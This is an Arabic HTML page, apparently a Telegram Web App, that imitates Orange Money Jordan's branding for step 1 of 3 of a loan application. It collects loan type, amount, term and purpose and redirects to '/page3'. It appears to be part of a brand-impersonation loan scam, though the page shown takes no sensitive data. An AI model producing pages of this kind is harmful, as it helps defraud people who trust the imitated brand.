<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>أورانج موني - طلب القرض</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root {
            --orange-primary: #f16e00;
            --orange-hover: #d66100;
            --bg-color: #e5e5e5;
            --card-bg: #ffffff;
            --text-main: #000000;
            --text-muted: #888888;
            --input-border: #e2e8f0;
        }
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: var(--bg-color); margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
        .app-header { width: 100%; background-color: var(--orange-primary); height: 60px; padding: 0 20px; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
        .back-btn { color: white; text-decoration: none; font-weight: 600; font-size: 15px; cursor: pointer; }
        .header-title { position: absolute; left: 50%; transform: translateX(-50%); display: flex; font-size: 20px; font-weight: 800; color: #fff; }
        .card { background: white; width: 90%; max-width: 440px; margin: 20px 0 30px; padding: 32px 24px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05); display: flex; flex-direction: column; }
        .main-title { font-size: 26px; color: var(--text-main); margin: 0 0 6px; text-align: center; font-weight: 800; }
        .subtext { font-size: 14px; color: var(--text-muted); text-align: center; margin-bottom: 20px; }
        .step-indicator { display: flex; gap: 12px; margin: 0 auto 32px; width: 80%; }
        .step-bar { flex: 1; height: 4px; background-color: #e2e8f0; border-radius: 2px; }
        .step-bar.active { background-color: var(--orange-primary); }
        .form-group { margin-bottom: 22px; display: flex; flex-direction: column; text-align: right; }
        .form-group label { font-size: 15px; font-weight: 700; color: #222222; margin-bottom: 10px; }
        .form-control { font-size: 15px; padding: 14px 16px; border: 1px solid var(--input-border); border-radius: 10px; background-color: #ffffff; color: #333333; outline: none; width: 100%; text-align: right; }
        .btn-next { background-color: var(--orange-primary); color: white; border: none; width: 100%; padding: 16px; border-radius: 10px; font-size: 15px; font-weight: 800; cursor: pointer; margin-top: 15px; text-transform: uppercase; }
        .footer-banner { width: 100%; text-align: center; padding: 20px; font-size: 12px; color: #666666; margin-top: auto; }
    </style>
</head>
<body>

<div class="app-header">
    <a href="/" class="back-btn">رجوع ←</a>
    <div class="header-title"><span>Orange Money</span></div>
    <div style="width:24px"></div>
</div>

<div class="card">
    <h1 class="main-title">طلب القرض</h1>
    <div class="subtext">الخطوة 1 من 3</div>

    <div class="step-indicator">
        <div class="step-bar active"></div>
        <div class="step-bar"></div>
        <div class="step-bar"></div>
    </div>

    <form id="loanForm" onsubmit="submitStep1(event)">
        <div class="form-group">
            <label for="loanType">نوع القرض</label>
            <select id="loanType" class="form-control" required>
                <option value="قرض شخصي" selected>قرض شخصي</option>
                <option value="قرض تجاري">قرض تجاري</option>
                <option value="قرض تعليمي">قرض تعليمي</option>
            </select>
        </div>

        <div class="form-group">
            <label for="loanAmt">مبلغ القرض (دينار)</label>
            <input type="number" id="loanAmt" class="form-control" value="1500" required>
        </div>

        <div class="form-group">
            <label for="loanTerm">مدة القرض</label>
            <select id="loanTerm" class="form-control" required>
                <option value="6 أشهر">6 أشهر</option>
                <option value="12 شهر" selected>12 شهر</option>
                <option value="24 شهر">24 شهر</option>
            </select>
        </div>

        <div class="form-group">
            <label for="loanPurpose">الغرض من القرض</label>
            <textarea id="loanPurpose" class="form-control" placeholder="ما هو استخدام هذا القرض؟" required></textarea>
        </div>

        <button type="submit" class="btn-next">الخطوة التالية</button>
    </form>
</div>

<div class="footer-banner">© 2026 Orange Money الأردن</div>

<script>
    function submitStep1(event) {
        event.preventDefault();
        const loanAmt = document.getElementById('loanAmt').value;
        const loanTermVal = document.getElementById('loanTerm').value;
        localStorage.setItem('loan_amount', loanAmt);
        localStorage.setItem('loan_term', loanTermVal);
        window.location.href = "/page3";
    }
</script>
</body>
</html>
